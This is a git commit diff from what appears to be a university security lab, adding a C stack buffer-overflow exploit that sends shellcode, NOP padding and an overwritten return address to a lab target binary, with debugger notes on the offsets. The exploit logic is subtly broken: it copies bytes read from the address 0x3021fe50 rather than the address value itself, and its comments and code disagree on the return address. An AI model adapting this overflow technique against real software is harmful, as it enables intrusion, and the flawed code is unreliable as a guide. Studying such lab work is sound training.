867b5ac37014fab9a3ff77233e2591fa3a9fcaff
Malhar Shah <Malhar.Shah@ibm.com>
2023-01-23 15:38:34 -0500

    Completed exploit 1 and testing now

--- Lab 1/ECE568-lab1/sploits/sploit1.c
+++ Lab 1/ECE568-lab1/sploits/sploit1.c
@@ -6,14 +6,48 @@
 
 #define TARGET "../targets/target1"
 
+//rip at 0x3021fec8
+//0x3021fec8: 0x004009b8
+//Therefore, the return address once main completes, is 0x004009b8
+
+//p &buf
+//$1 = (char (*) [96]) 0x3021fe50
+//Therefore, the address of buf is 0x3021fe50 to 0x3021fe50+96 = 0x3021feb0
+
+//The difference between the rip (program counter) and the address of buf is 0x3021fec8 - 0x3021fe50 = 0x78 = 120
+//We need to fill the buffer with 120 bytes of shellcode, and No-OPs
+//Then 8 bytes of the return address of buffer (0x3021feb0)
+
+#define BUF_SIZE 128
+
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
 
+	char bufferExploit[BUF_SIZE];
+
+	//Fill the first bytes with shellcode
+	int i;
+	for (i = 0; i < strlen(shellcode); i++) {
+		bufferExploit[i] = shellcode[i];
+	}
+
+	//Fill the remaining bytes with No-OPs
+	for (i = strlen(shellcode); i < BUF_SIZE - 8; i++) {
+		bufferExploit[i] = 0x90;
+	}
+
+	//Fill the last 8 bytes with the return address of buffer
+	char *newReturnAddress = (char *) 0x3021fe50;
+	for (i = 0; i < 8; i++) {
+		bufferExploit[BUF_SIZE - 8 + i] = newReturnAddress[i];
+	}
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	//args[1] = "hi there";
+	args[1] = bufferExploit;
 	args[2] = NULL;
 
 	env[0] = NULL;
